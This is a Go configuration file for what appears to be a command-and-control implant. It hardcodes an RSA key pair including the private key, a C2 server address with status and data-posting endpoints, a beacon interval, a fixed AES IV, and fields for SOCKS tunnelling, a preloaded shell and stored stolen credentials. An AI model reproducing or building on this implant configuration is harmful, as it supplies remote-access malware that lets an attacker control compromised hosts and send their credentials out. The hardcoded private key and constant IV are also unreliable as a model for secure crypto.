package config

import (
	"time"
)

var (
	RsaPublicKey = []byte(`
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCTPK7U38QBCS5o8rpaMVThN1MnNdMosOnTVk+a
bOpeCI0GraidwG+7JIPMEwGcXBzqWkEAJcJ268nfi86A+4FpN0zm7j9907Nbpqnn+dhLi1AS+rmD
i+s86EytixLzihxfN1mjimca/9/dXH8gsNN9fxiQx27x4QiEzcprkvFjowIDAQAB
-----END PUBLIC KEY-----	
	`)
	RsaPrivateKey = []byte(`
-----BEGIN PRIVATE KEY-----
MIICdQIBADANBgkqhkiG9w0BAQEFAASCAl8wggJbAgEAAoGBAJM8rtTfxAEJLmjyuloxVOE3Uyc1
0yiw6dNWT5ps6l4IjQatqJ3Ab7skg8wTAZxcHOpaQQAlwnbryd+LzoD7gWk3TObuP33Ts1umqef5
2EuLUBL6uYOL6zzoTK2LEvOKHF83WaOKZxr/391cfyCw031/GJDHbvHhCITNymuS8WOjAgMBAAEC
gYAEe6SE0i/sc5RBmTSqM392rk0gtICN+lT/rt7LUpx96ZuYf1EcIRRqZSbL3+OzhezACDrktkGc
Yehcw9BoGGTfIMofgG0462FmaJyqrzy6vdi84z8AaI5MdN+eaAg80urz70RxOgfm8uljCv8YNYcW
od69hPHKZn0/AYQGneLmgQJBAPeidqKagsnAh2cqkw+S8vDvEhNvQLtFTY84N173jk9zQdQQ9TJk
C+fttKdqqEUi2XNjg/9abnEQy9CplMwq9AcCQQCYNfv9xOr6158PTe/6nviHdVOGwSQ6YY2Vsq9A
qUmzEKE1V93AaGUXnA/OUVi+eWrjIxgJ2tQwhrS/vruNi4SFAkBJ6ItP7J2saXIAMIzD0TABCNl0
Q3gmbIDBhh3AklI/FD9Jc+Y6q/GBv0hzzzl5qPUNo136EJt103WBSZvHc+pxAkBnaZYRLe6wCjro
/Pyke8lCzvW2whZJC+pT4JitB9cor423XkEs7kBwr/kVJbNzha6XL0qvt1setQasl3t5iWa5AkBx
u6rc/0Jb6AU5w6IDmsEMtOagudrtCA3i3Ra0hJ97nHI6UYEOk/TIk0H6RnXu+jxmTec9KiPl4/K/
ziENcO3c
-----END PRIVATE KEY-----
	`)


	// C2        = "0.0.0.0:4445"
	C2		  = "192.168.178.97:80"
	plainHTTP = "http://"
	sslHTTP   = "https://"
	GetUrl    = plainHTTP + C2 + "/api/v1/status"
	PostUrl   = plainHTTP + C2 + "/api/v1/entry?id="
	WaitTime  = 10000 * time.Millisecond
	VerifySSLCert = true
	TimeOut time.Duration  = 10 //seconds

	IV        = []byte("abcdefghijklmnop")
	GlobalKey []byte
	AesKey    []byte
	HmacKey   []byte
	Counter   = 0
	TcpBeacons []TcpBeacon
	SocksSessions []*SocksSession
	ShellPreLoadedFile string
	StoredCredentials *StoredCredential
)

const (
	DebugMode = true
)